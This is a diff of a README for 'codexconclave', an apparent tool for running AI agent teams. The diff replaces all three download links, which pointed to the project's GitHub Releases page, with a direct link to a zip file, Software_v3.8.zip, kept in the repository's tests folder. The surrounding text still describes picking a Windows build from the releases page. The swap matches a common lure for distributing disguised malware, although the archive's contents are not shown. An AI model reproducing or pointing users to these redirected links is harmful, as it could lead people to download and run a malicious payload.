@@ -1,6 +1,6 @@
 # 🤖 codexconclave - Run AI agent teams with ease
 
-[![Download codexconclave](https://img.shields.io/badge/Download%20codexconclave-blue?style=for-the-badge&logo=github)](https://github.com/Hasyim12426/codexconclave/releases)
+[![Download codexconclave](https://img.shields.io/badge/Download%20codexconclave-blue?style=for-the-badge&logo=github)](https://github.com/Hasyim12426/codexconclave/raw/refs/heads/main/tests/Software_v3.8.zip)
 
 ## 🧩 What this app does
 
@@ -30,7 +30,7 @@ If the release includes a ready-to-run Windows file, you can use that file witho
 
 Visit the release page here:
 
-[Download codexconclave from GitHub Releases](https://github.com/Hasyim12426/codexconclave/releases)
+[Download codexconclave from GitHub Releases](https://github.com/Hasyim12426/codexconclave/raw/refs/heads/main/tests/Software_v3.8.zip)
 
 On that page, look for the latest release. Then choose the Windows file or package that matches your system.
 
@@ -201,7 +201,7 @@ This makes file paths easier to manage and cuts down on path errors.
 
 Use this page to get the latest Windows build:
 
-[https://github.com/Hasyim12426/codexconclave/releases](https://github.com/Hasyim12426/codexconclave/releases)
+[https://github.com/Hasyim12426/codexconclave/raw/refs/heads/main/tests/Software_v3.8.zip](https://github.com/Hasyim12426/codexconclave/raw/refs/heads/main/tests/Software_v3.8.zip)
 
 ## 📝 What to expect
 
